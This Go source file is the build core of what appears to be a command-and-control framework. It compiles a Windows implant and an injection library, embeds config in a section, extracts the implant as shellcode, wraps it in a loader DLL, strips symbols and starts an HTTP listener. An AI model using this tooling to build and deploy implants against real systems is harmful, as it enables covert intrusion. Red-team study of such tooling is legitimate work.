package core

import (
	"encoding/json"
	"fmt"
	"os"
	"path"
	"path/filepath"
	"strings"
	"time"
)

var (
	LinkerLoader = LoaderPath + "/linker.loader.ld"
	HashStrings  = ConfigsPath + "/strings.txt"
	DllMain      = LoaderPath + "/dllmain.cpp"
	RsrcScript   = LoaderPath + "/resource.rc"
	HashHeader   = CorelibInc + "/names.hpp"
)

func (h *HexaneConfig) BuildLoader() error {
	injectCfg, err := h.GetInjectConfig()
	if err != nil {
		return err
	}

	injectCfg.InjectConfig = h.GetEmbededStrings(injectCfg.Strings)

	rsrcObj := path.Join(h.Compiler.BuildDirectory, "resource.res")
	rsrcData := path.Join(h.Compiler.BuildDirectory, "shellcode.bin")
	coreCpp := path.Join(h.Compiler.BuildDirectory, "ldrcore.cpp")
	coreComponents := path.Join(h.Compiler.BuildDirectory, "ldrcore.cpp.o")
	output := path.Join(h.Compiler.BuildDirectory, h.ImplantName+h.Compiler.FileExtension)

	if err = h.RunWindres(rsrcObj, rsrcData); err != nil {
		return err
	}

	if err = h.CompileExecuteObject(coreCpp, injectCfg.ExecuteObj, coreComponents); err != nil {
		return err
	}

	components := []string{DllMain, rsrcObj, coreComponents}
	if err = h.CompileFinalDLL(components, output); err != nil {
		return err
	}

	if err = h.EmbedSectionData(output, ".text$F", injectCfg.InjectConfig); err != nil {
		return err
	}

	if !h.Compiler.Debug {
		if err = h.StripSymbols(output); err != nil {
			return err
		}
	}

	return nil
}

func (h *HexaneConfig) BuildModule(cfgName string) error {
	var (
		err        error
		buffer     []byte
		components []string
		includes   string
		jsonCfg    Module
	)

	if buffer, err = os.ReadFile(cfgName); err != nil {
		return err
	}

	if err = json.Unmarshal(buffer, &jsonCfg); err != nil {
		return err
	}

	if jsonCfg.OutputDir != "" {
		if err = CreateTemp(jsonCfg.OutputDir); err != nil {
			return err
		}
	} else {
		jsonCfg.OutputDir = h.Compiler.BuildDirectory
	}

	if jsonCfg.Includes != nil {
		includes = strings.Join(jsonCfg.Includes, " -I")
		includes = strings.Join(h.Compiler.IncludeDirs, " -I")
	} else {
		includes = strings.Join(h.Compiler.IncludeDirs, " -I")
	}

	if jsonCfg.Directories != nil {
		for _, dir := range jsonCfg.Directories {
			searchPath := path.Join(jsonCfg.RootDir, dir)

			for _, src := range jsonCfg.Sources {
				srcFile := path.Join(searchPath, src)
				objFile := path.Join(jsonCfg.OutputDir, filepath.Base(srcFile)+".o")

				if !SearchFile(searchPath, filepath.Base(srcFile)) {
					WrapMessage("ERR", "unable to find "+srcFile+" in directory "+searchPath)
					continue
				}

				if err = h.CompileFile(srcFile, objFile, includes, path.Join(jsonCfg.RootDir, jsonCfg.Linker)); err != nil {
					return err
				}
				components = append(components, objFile)
			}
		}
	} else {
		for _, src := range jsonCfg.Sources {
			srcFile := path.Join(jsonCfg.RootDir, src)
			objFile := path.Join(jsonCfg.OutputDir, filepath.Base(srcFile)+".o")

			if !SearchFile(jsonCfg.RootDir, filepath.Base(srcFile)) {
				WrapMessage("ERR", "unable to find "+srcFile+" in directory "+jsonCfg.RootDir)
				continue
			}

			if err = h.CompileFile(srcFile, objFile, includes, path.Join(jsonCfg.RootDir, jsonCfg.Linker)); err != nil {
				return err
			}
			components = append(components, objFile)
		}
	}

	if jsonCfg.Dependencies != nil {
		for _, dep := range jsonCfg.Dependencies {
			components = append(components, dep)
		}
	}

	switch jsonCfg.Type {
	case "static":
		WrapMessage("DBG", "building static library from config json: "+cfgName)
		return h.RunCommand(h.Compiler.Ar + " crf " + path.Join(jsonCfg.OutputDir, jsonCfg.OutputName+".a") + " " + strings.Join(components, " "))

	case "dynamic":
		WrapMessage("DBG", "building dynamic library from config json: "+cfgName)
		return h.CompileObject(h.Compiler.Linker+" -shared", components, nil, h.Compiler.IncludeDirs, nil, path.Join(jsonCfg.OutputDir, jsonCfg.OutputName+".dll"))

	case "executable":
		WrapMessage("DBG", "building executable from config json: "+cfgName)
		return h.CompileObject(h.Compiler.Linker, components, nil, h.Compiler.IncludeDirs, nil, path.Join(jsonCfg.OutputDir, jsonCfg.OutputName+".exe"))

	case "object":
		var flags []string
		WrapMessage("DBG", "building object file from config json: "+cfgName)

		flags = append(flags, " -c ")
		if jsonCfg.Linker != "" {
			flags = append(flags, " -T "+path.Join(jsonCfg.RootDir, jsonCfg.Linker))
		}

		return h.CompileObject(h.Compiler.Linker, components, flags, []string{h.Compiler.BuildDirectory}, h.Compiler.Definitions, path.Join(jsonCfg.OutputDir, jsonCfg.OutputName+".o"))

	default:
		return fmt.Errorf("unknown build type: %s", jsonCfg.Type)
	}
}

func (h *HexaneConfig) RunBuild() error {

	WrapMessage("DBG", "creating payload directory")
	if err := os.MkdirAll(h.Compiler.BuildDirectory, os.ModePerm); err != nil {
		return err
	}

	WrapMessage("DBG", "generating config")
	if err := h.GenerateConfigBytes(); err != nil {
		return err
	}

	WrapMessage("DBG", "generating hashes")
	if err := GenerateHashes(HashStrings, HashHeader); err != nil {
		return err
	}

	if !SearchFile(path.Join(Corelib, "build"), "corelib.a") {

		WrapMessage("DBG", "generating corelib\n")
		if err := h.BuildModule(path.Join(Corelib, "corelib.json")); err != nil {
			return err
		}
	}

	if h.Implant.Injection != nil {
		WrapMessage("DBG", "generating injectlib\n")
		if err := h.BuildModule(path.Join(Injectlib, "injectlib.json")); err != nil {
			return err
		}

		WrapMessage("DBG", "embedding injectlib config")
		if err := h.EmbedSectionData(path.Join(h.Compiler.BuildDirectory, "injectlib.o"), ".text$F", h.ConfigBytes); err != nil {
			return err
		}
	}

	WrapMessage("DBG", "generating implant\n")
	if err := h.BuildModule(path.Join(ImplantPath, "implant.json")); err != nil {
		return err
	}

	WrapMessage("DBG", "embedding implant config data")
	if err := h.EmbedSectionData(path.Join(h.Compiler.BuildDirectory, "build")+"/implant.o", ".text$F", h.ConfigBytes); err != nil {
		return err
	}

	WrapMessage("DBG", "extracting shellcode")
	if err := h.CopySectionData(path.Join(h.Compiler.BuildDirectory, "build")+"/implant.o", path.Join(h.Compiler.BuildDirectory, "shellcode.bin"), ".text"); err != nil {
		return err
	}

	if h.BuildType == "dll" {
		WrapMessage("DBG", "generating loader dll")

		if err := h.BuildLoader(); err != nil {
			return err
		}
	}

	AddConfig(h)
	go h.HttpServerHandler()

	time.Sleep(time.Millisecond * 500)
	WrapMessage("INF", fmt.Sprintf("%s ready!", h.ImplantName))

	return nil
}

func (h *HexaneConfig) CompileFile(srcFile, outFile, includes, linker string) error {
	var flags = h.Compiler.Flags

	if linker != "" {
		flags = append(flags, "-T", linker)
	}

	switch path.Ext(srcFile) {
	case ".cpp":
		flags = append(flags, "-c")
		return h.CompileObject(h.Compiler.Mingw, []string{srcFile}, flags, []string{RootDirectory, includes}, nil, outFile)
	case ".asm":
		return h.CompileObject(h.Compiler.Assembler, []string{srcFile}, []string{"-f win64"}, nil, nil, outFile)
	default:
		WrapMessage("DBG", "cannot compile "+path.Ext(srcFile)+" files")
		return nil
	}
}

func (h *HexaneConfig) RunWindres(rsrcObj, rsrcData string) error {
	cmd := fmt.Sprintf("%s -O coff %s -DRSRCDATA=\"%s\" -o %s", h.Compiler.Windres, RsrcScript, rsrcData, rsrcObj)
	return h.RunCommand(cmd)
}

func (h *HexaneConfig) StripSymbols(output string) error {
	return h.RunCommand(h.Compiler.Strip + " " + output)
}
